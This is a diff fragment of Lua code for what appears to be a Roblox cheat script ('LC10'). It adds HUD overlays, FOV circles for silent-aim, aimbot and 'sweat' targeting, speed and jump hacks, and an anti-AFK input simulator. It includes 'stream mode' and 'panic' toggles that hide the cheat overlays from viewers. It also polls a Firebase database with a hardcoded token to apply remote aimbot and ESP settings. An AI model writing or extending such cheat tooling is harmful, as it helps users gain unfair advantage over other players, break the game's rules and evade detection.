+        return math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    end)
+    return ok and ping or 0
+end
+function getRAM()
+    local ok, mb = pcall(function()
+        return math.floor(Stats:GetTotalMemoryUsageMb())
+    end)
+    return ok and mb or 0
+end
+
+task.spawn(function()
+    while task.wait(0.25) do
+        if not hudState.gui or hidden or streamHidden then continue end
+        applyCrosshair() applyInfoPanelPos() applyHealthBarPos()
+        local showAny = C.HUD_ShowFPS or C.HUD_ShowPing or C.HUD_ShowRAM or C.HUD_ShowPlayers or C.HUD_ShowCoords or C.HUD_ShowTime
+        hudState.infoPanel.Visible = showAny
+        if C.HUD_ShowFPS then hudState.fpsLbl.Visible = true hudState.fpsLbl.Text = "FPS: " .. fpsCounter.value else hudState.fpsLbl.Visible = false end
+        if C.HUD_ShowPing then hudState.pingLbl.Visible = true hudState.pingLbl.Text = "Ping: " .. getPing() .. "ms" else hudState.pingLbl.Visible = false end
+        if C.HUD_ShowRAM then hudState.ramLbl.Visible = true hudState.ramLbl.Text = "RAM: " .. getRAM() .. "MB" else hudState.ramLbl.Visible = false end
+        if C.HUD_ShowPlayers then hudState.playersLbl.Visible = true hudState.playersLbl.Text = "Players: " .. #Players:GetPlayers() else hudState.playersLbl.Visible = false end
+        if C.HUD_ShowCoords then
+            local ch = LP.Character
+            local root = ch and ch:FindFirstChild("HumanoidRootPart")
+            if root then
+                local p = root.Position
+                hudState.coordsLbl.Visible = true
+                hudState.coordsLbl.Text = string.format("XYZ: %d, %d, %d", p.X, p.Y, p.Z)
+            else hudState.coordsLbl.Visible = false end
+        else hudState.coordsLbl.Visible = false end
+        if C.HUD_ShowTime then hudState.timeLbl.Visible = true hudState.timeLbl.Text = os.date("%H:%M:%S") else hudState.timeLbl.Visible = false end
+        if C.HUD_HealthBar then
+            local ch = LP.Character
+            local hum = ch and ch:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hudState.healthBarBg.Visible = true
+                local pct = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
+                hudState.healthBar.Size = UDim2.new(pct, -4, 1, -4)
+                local r, g, b
+                if pct > 0.5 then r, g, b = 80, 220, 120
+                elseif pct > 0.25 then r, g, b = 255, 200, 80
+                else r, g, b = 255, 60, 60 end
+                hudState.healthBar.BackgroundColor3 = Color3.fromRGB(r, g, b)
+                hudState.healthLbl.Text = math.floor(hum.Health) .. " / " .. math.floor(hum.MaxHealth)
+            else hudState.healthBarBg.Visible = false end
+        else hudState.healthBarBg.Visible = false end
+        hudState.watermark.Visible = C.HUD_Watermark
+    end
+end)
+
+--=======================  FOV GUIs  =========================
+local fovGui = Instance.new("ScreenGui")
+fovGui.Name = "LC10Fov" fovGui.ResetOnSpawn = false fovGui.IgnoreGuiInset = true
+pcall(function() fovGui.Parent = game:GetService("CoreGui") end)
+if not fovGui.Parent then fovGui.Parent = LP:WaitForChild("PlayerGui") end
+_G.FxFovGui = fovGui
+local fovC = Instance.new("Frame")
+fovC.AnchorPoint = Vector2.new(0.5, 0.5) fovC.Position = UDim2.new(0.5, 0, 0.5, 0)
+fovC.BackgroundTransparency = 1 fovC.Parent = fovGui
+local fovS = Instance.new("UIStroke") fovS.Thickness = 2 fovS.Parent = fovC
+local fovCo = Instance.new("UICorner") fovCo.CornerRadius = UDim.new(1,0) fovCo.Parent = fovC
+
+local aFovGui = Instance.new("ScreenGui")
+aFovGui.Name = "LC10AimFov" aFovGui.ResetOnSpawn = false aFovGui.IgnoreGuiInset = true
+pcall(function() aFovGui.Parent = game:GetService("CoreGui") end)
+if not aFovGui.Parent then aFovGui.Parent = LP:WaitForChild("PlayerGui") end
+_G.FxAimFovGui = aFovGui
+local aFovC = Instance.new("Frame")
+aFovC.AnchorPoint = Vector2.new(0.5, 0.5) aFovC.Position = UDim2.new(0.5, 0, 0.5, 0)
+aFovC.BackgroundTransparency = 1 aFovC.Parent = aFovGui
+local aFovS = Instance.new("UIStroke") aFovS.Thickness = 2 aFovS.Parent = aFovC
+local aFovCo = Instance.new("UICorner") aFovCo.CornerRadius = UDim.new(1,0) aFovCo.Parent = aFovC
+
+local sFovGui = Instance.new("ScreenGui")
+sFovGui.Name = "LC10SweatFov" sFovGui.ResetOnSpawn = false sFovGui.IgnoreGuiInset = true
+pcall(function() sFovGui.Parent = game:GetService("CoreGui") end)
+if not sFovGui.Parent then sFovGui.Parent = LP:WaitForChild("PlayerGui") end
+_G.FxSweatFovGui = sFovGui
+local sFovC = Instance.new("Frame")
+sFovC.AnchorPoint = Vector2.new(0.5, 0.5) sFovC.Position = UDim2.new(0.5, 0, 0.5, 0)
+sFovC.BackgroundTransparency = 1 sFovC.Visible = false sFovC.Parent = sFovGui
+local sFovS = Instance.new("UIStroke") sFovS.Thickness = 2 sFovS.Parent = sFovC
+local sFovCo = Instance.new("UICorner") sFovCo.CornerRadius = UDim.new(1,0) sFovCo.Parent = sFovC
+
+--=======================  UNIFIED RUNSERVICE  ===============
+RunService.Heartbeat:Connect(function()
+    fpsCounter.frames = fpsCounter.frames + 1
+    local now = tick()
+    if now - fpsCounter.lastUpdate >= 1 then
+        fpsCounter.value = math.floor(fpsCounter.frames / (now - fpsCounter.lastUpdate))
+        fpsCounter.frames = 0
+        fpsCounter.lastUpdate = now
+    end
+    cachedMyPos = Camera.CFrame.Position
+    cachedPlayers = Players:GetPlayers()
+    local ch = LP.Character
+    local equipped = ch and ch:FindFirstChildOfClass("Tool")
+    if not equipped then isZooming = false
+    else isZooming = (BASE_FOV - Camera.FieldOfView) > 10 end
+
+    if C.AntiFling and not hidden and ch then
+        local root = ch:FindFirstChild("HumanoidRootPart")
+        if root and root.Velocity.Magnitude > 500 then
+            root.Velocity = Vector3.zero root.RotVelocity = Vector3.zero
+        end
+    end
+
+    if hidden or streamHidden then
+        if fovC.Visible then fovC.Visible = false end
+        if aFovC.Visible then aFovC.Visible = false end
+        if sFovC.Visible then sFovC.Visible = false end
+    else
+        local shouldShowFov = C.ShowFov
+        if fovC.Visible ~= shouldShowFov then fovC.Visible = shouldShowFov end
+        if shouldShowFov then
+            fovC.Size = UDim2.new(0, C.FovRadius*2, 0, C.FovRadius*2)
+            fovS.Color = C.FovColor
+        end
+        local shouldShowAimFov = C.ShowAimbotFov and C.Aimbot
+        if aFovC.Visible ~= shouldShowAimFov then aFovC.Visible = shouldShowAimFov end
+        if shouldShowAimFov then
+            aFovC.Size = UDim2.new(0, C.AimbotFov*2, 0, C.AimbotFov*2)
+            aFovS.Color = C.AimbotFovColor
+        end
+        local shouldShowSweatFov = C.Sweat_ShowFov and C.Sweat_Enabled
+        if sFovC.Visible ~= shouldShowSweatFov then sFovC.Visible = shouldShowSweatFov end
+        if shouldShowSweatFov then
+            if sweatTargetPlr then
+                local pulse = 0.6 + math.abs(math.sin(tick() * 4)) * 0.4
+                sFovS.Transparency = 1 - pulse
+            else
+                sFovS.Transparency = 0.4
+            end
+            sFovC.Size = UDim2.new(0, C.Sweat_Fov*2, 0, C.Sweat_Fov*2)
+            sFovS.Color = C.Sweat_FovColor
+        end
+    end
+end)
+
+--=======================  ANTI-AFK  =========================
+if C.AntiAFK then
+    task.spawn(function()
+        while task.wait(60) do
+            if not hidden and not streamHidden then
+                local vu = game:GetService("VirtualUser")
+                pcall(function()
+                    vu:Button2Down(Vector2.new(0,0), Camera.CFrame)
+                    task.wait(1)
+                    vu:Button2Up(Vector2.new(0,0), Camera.CFrame)
+                end)
+            end
+        end
+    end)
+end
+
+--=======================  SPEED/JUMP  =======================
+task.spawn(function()
+    while task.wait(1) do
+        pcall(function()
+            if hidden then return end
+            local ch = LP.Character
+            local hum = ch and ch:FindFirstChildOfClass("Humanoid")
+            if hum then
+                if C.SpeedEnabled then hum.WalkSpeed = C.SpeedValue end
+                if C.JumpEnabled then hum.UseJumpPower = true hum.JumpPower = C.JumpValue end
+            end
+        end)
+    end
+end)
+
+--=======================  REMOTE SYNC (Firebase)  ===========
+local FIREBASE = "https://lc10-config-default-rtdb.firebaseio.com"
+local TOKEN    = "lc10_a8f7d3k9x2p5q8m1_2026"
+local URL      = FIREBASE .. "/LC10/" .. TOKEN .. "/config.json"
+local INTERVAL = 2
+
+local function hexToColor(hex)
+    if type(hex) ~= "string" then return nil end
+    hex = hex:gsub("#", "")
+    if #hex ~= 6 then return nil end
+    local r = tonumber(hex:sub(1,2), 16)
+    local g = tonumber(hex:sub(3,4), 16)
+    local b = tonumber(hex:sub(5,6), 16)
+    if not r or not g or not b then return nil end
+    return Color3.fromRGB(r, g, b)
+end
+
+local function applyConfig(data)
+    if type(data) ~= "table" then return end
+
+    if data.silentAim then
+        local s = data.silentAim
+        if s.enabled ~= nil then C.SilentAim = s.enabled updateHookState() end
+        if s.aimPart then C.AimPart = s.aimPart end
+        if s.hitChance then C.Silent_HitChance = s.hitChance end
+        if s.checkCivil ~= nil then C.Silent_CheckCivil = s.checkCivil end
+        if s.pixelAim ~= nil then C.Silent_Pixel = s.pixelAim end
+        if s.wallCheck ~= nil then C.WallCheck = s.wallCheck end
+        if s.teamCheck ~= nil then C.TeamCheck = s.teamCheck end
+        if s.prioLowHP ~= nil then C.PrioLowHP = s.prioLowHP end
+        if s.fov then C.FovRadius = s.fov end
+        if s.showFov ~= nil then C.ShowFov = s.showFov end
+        if s.fovColor then local c = hexToColor(s.fovColor) if c then C.FovColor = c end end
+    end
+
+    if data.aimbot then
+        local a = data.aimbot
+        if a.enabled ~= nil then C.Aimbot = a.enabled end
+        if a.onlyZoom ~= nil then C.AimbotOnlyZoom = a.onlyZoom end
+        if a.snap ~= nil then C.AimbotSnap = a.snap end
+        if a.aimPart then C.AimbotPart = a.aimPart end
+        if a.smooth then C.AimbotSmooth = a.smooth end
+        if a.teamCheck ~= nil then C.AimbotTeamCheck = a.teamCheck end
+        if a.prioCrosshair ~= nil then C.AimbotPrioCrosshair = a.prioCrosshair end
+        if a.checkCivil ~= nil then C.Aimbot_CheckCivil = a.checkCivil end
+        if a.fov then C.AimbotFov = a.fov end
+        if a.showFov ~= nil then C.ShowAimbotFov = a.showFov end
+        if a.fovColor then local c = hexToColor(a.fovColor) if c then C.AimbotFovColor = c end end
+    end
+
+    if data.sweat then
+        local w = data.sweat
+        if w.enabled ~= nil then C.Sweat_Enabled = w.enabled end
+        if w.aimPart then C.Sweat_Part = w.aimPart end
+        if w.pixelAim ~= nil then C.Sweat_PixelAim = w.pixelAim end
+        if w.predict then C.Sweat_Predict = w.predict end
+        if w.lockStrength then C.Sweat_LockStrength = w.lockStrength end
+        if w.reaction then C.Sweat_Reaction = w.reaction end
+        if w.fov then C.Sweat_Fov = w.fov end
+        if w.showFov ~= nil then C.Sweat_ShowFov = w.showFov end
+        if w.fovColor then local c = hexToColor(w.fovColor) if c then C.Sweat_FovColor = c end end
+        if w.teamCheck ~= nil then C.Sweat_TeamCheck = w.teamCheck end
+        if w.onlyZoom ~= nil then C.Sweat_OnlyZoom = w.onlyZoom end
+    end
+
+    if data.esp then
+        local e = data.esp
+        if e.enabled ~= nil then C.ESP = e.enabled end
+        if e.names ~= nil then C.ESPNames = e.names end
+        if e.distance ~= nil then C.ESPDist = e.distance end
+        if e.weapon ~= nil then C.ESPWeapon = e.weapon end
+        if e.health ~= nil then C.ESPHealth = e.health end
+        if e.teamCheck ~= nil then C.ESPTeamCheck = e.teamCheck end
+        if e.highlightColor then local c = hexToColor(e.highlightColor) if c then C.ESPColor = c end end
+        if e.skeleton ~= nil then C.SkeletonESP = e.skeleton end
+        if e.skeletonColor then local c = hexToColor(e.skeletonColor) if c then C.SkeletonColor = c end end
+        if e.box ~= nil then C.BoxESP = e.box end
+        if e.boxColor then local c = hexToColor(e.boxColor) if c then C.BoxColor = c end end
+        if e.boxV2 ~= nil then C.BoxV2ESP = e.boxV2 end
+        if e.boxV2Color then local c = hexToColor(e.boxV2Color) if c then C.BoxV2Color = c end end
+        if e.tracer ~= nil then C.TracerESP = e.tracer end
+        if e.tracerColor then local c = hexToColor(e.tracerColor) if c then C.TracerColor = c end end
+    end
+
+    if data.misc then
+        local m = data.misc
+        if m.antiAFK ~= nil then C.AntiAFK = m.antiAFK end
+        if m.speedEnabled ~= nil then C.SpeedEnabled = m.speedEnabled end
+        if m.speedValue then C.SpeedValue = m.speedValue end
+        if m.jumpEnabled ~= nil then C.JumpEnabled = m.jumpEnabled end
+        if m.jumpValue then C.JumpValue = m.jumpValue end
+        if m.antiFling ~= nil then C.AntiFling = m.antiFling end
+    end
+
+    if data.hud then
+        local h = data.hud
+        if h.crosshair ~= nil then C.HUD_Crosshair = h.crosshair end
+        if h.crosshairStyle then C.HUD_CrosshairStyle = h.crosshairStyle end
+        if h.crosshairColor then local c = hexToColor(h.crosshairColor) if c then C.HUD_CrosshairColor = c end end
+        if h.crosshairSize then C.HUD_CrosshairSize = h.crosshairSize end
+        if h.crosshairThick then C.HUD_CrosshairThick = h.crosshairThick end
+        if h.showFPS ~= nil then C.HUD_ShowFPS = h.showFPS end
+        if h.showPing ~= nil then C.HUD_ShowPing = h.showPing end
+        if h.showRAM ~= nil then C.HUD_ShowRAM = h.showRAM end
+        if h.showPlayers ~= nil then C.HUD_ShowPlayers = h.showPlayers end
+        if h.showCoords ~= nil then C.HUD_ShowCoords = h.showCoords end
+        if h.showTime ~= nil then C.HUD_ShowTime = h.showTime end
+        if h.watermark ~= nil then C.HUD_Watermark = h.watermark end
+        if h.hideGameHUD ~= nil then
+            C.HUD_HideGameHUD = h.hideGameHUD
+            if setHideDefaultHUD then setHideDefaultHUD(h.hideGameHUD) end
+        end
+    end
+
+    if data.custom then
+        local c = data.custom
+        if c.rifleEnabled ~= nil then C.Custom_RifleEnabled = c.rifleEnabled end
+        if c.rifleColor then C.Custom_RifleColor = c.rifleColor end
+        if c.rifleSound then C.Custom_RifleSound = c.rifleSound end
+        if c.pistolEnabled ~= nil then C.Custom_PistolEnabled = c.pistolEnabled end
+        if c.pistolColor then C.Custom_PistolColor = c.pistolColor end
+        if c.pistolSound ~= nil then C.Custom_PistolSound = c.pistolSound end
+        if c.pistolAltSound then C.Custom_PistolAltSound = c.pistolAltSound end
+        if c.bufaloEnabled ~= nil then C.Custom_BufaloEnabled = c.bufaloEnabled end
+        if c.bufaloColor then C.Custom_BufaloColor = c.bufaloColor end
+        if c.vidrom ~= nil then C.Custom_Vidrom = c.vidrom end
+        if c.lineB ~= nil then C.Custom_LineB = c.lineB end
+        if c.lineBColor then C.Custom_LineBColor = c.lineBColor end
+    end
+
+    if data.fps then
+        local f = data.fps
+        if f.lowGraphics ~= nil then
+            C.FPS_LowGraphics = f.lowGraphics
+            if applyLowGraphics then applyLowGraphics(f.lowGraphics) end
+        end
+        if f.removeParticles ~= nil then
+            C.FPS_RemoveParticles = f.removeParticles
+            if applyRemoveParticles then applyRemoveParticles(f.removeParticles) end
+        end
+        if f.texturePack ~= nil then
+            C.FPS_TexturePack = f.texturePack
+            if applyTexturePack then applyTexturePack(f.texturePack) end
+        end
+        if f.removeFog ~= nil then
+            C.FPS_RemoveFog = f.removeFog
+            if applyRemoveFog then applyRemoveFog(f.removeFog) end
+        end
+        if f.fullbright ~= nil then
+            C.FPS_Fullbright = f.fullbright
+            if applyFullbright then applyFullbright(f.fullbright) end
+        end
+        if f.noShadows ~= nil then
+            C.FPS_NoShadows = f.noShadows
+            if applyNoShadows then applyNoShadows(f.noShadows) end
+        end
+    end
+
+    if data.panic then
+        local p = data.panic
+        if p.enabled ~= nil then C.PanicEnabled = p.enabled end
+        if p.taps then C.PanicTaps = p.taps end
+        if p.window then C.PanicWindow = p.window end
+        if p.streamMode ~= nil then
+            C.Stream_Enabled = p.streamMode
+            if _G.FxToggleStream then _G.FxToggleStream(p.streamMode) end
+        end
+        if p.hideESP ~= nil then C.Stream_HideESP = p.hideESP end
+        if p.hideFOV ~= nil then C.Stream_HideFOV = p.hideFOV end
+        if p.hideHUD ~= nil then C.Stream_HideHUD = p.hideHUD end
+    end
+end
+
+local lastHash = nil
+local function hashConfig(t)
+    return game:GetService("HttpService"):JSONEncode(t or {})
+end
+
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local req = request or http_request or (syn and syn.request) or (http and http.request)
+
+    while true do
+        task.wait(INTERVAL)
+        pcall(function()
+            local res
+            if req then
+                local ok, r = pcall(req, { Url = URL, Method = "GET" })
+                res = ok and r and r.Body or nil
+            else
+                local ok, r = pcall(function() return game:HttpGet(URL) end)
+                res = ok and r or nil
+            end
+
+            if res then
+                local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
+                if decodeOk and data then
+                    local newHash = hashConfig(data)
+                    if newHash ~= lastHash then
+                        lastHash = newHash
+                        applyConfig(data)
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+print("[LC10] Remote sync iniciado — Firebase conectado")
+print("[LC10] v15.13 REMOTE-ONLY carregado — sem painel in-game")
